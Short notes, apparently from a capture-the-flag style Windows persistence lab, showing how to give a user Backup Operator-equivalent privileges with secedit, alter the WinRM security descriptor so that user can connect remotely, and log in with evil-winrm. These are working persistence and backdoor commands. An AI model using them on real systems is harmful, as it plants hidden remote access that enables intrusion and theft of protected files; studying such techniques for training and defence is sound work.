Make an user have equivalent privileges to any Backup Operator by setting SeBackupPrivilege and SeRestorePrivilege:

	secedit /export /cfg config.inf
		Add [user] to SeBackupPrivilege and SeRestorePrivilege
	secedit /import /cfg config.inf /db config.sdb
	secedit /configure /db config.sdb /cfg config.inf

The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow thmuser2 to connect. Think of a security descriptor as an ACL but applied to other system facilities.
To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell (you'll need to use the GUI session for this):

	PS: Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

Connect via WinRm

	evil-winrm -i [IP victim] -u [user] -p [password]
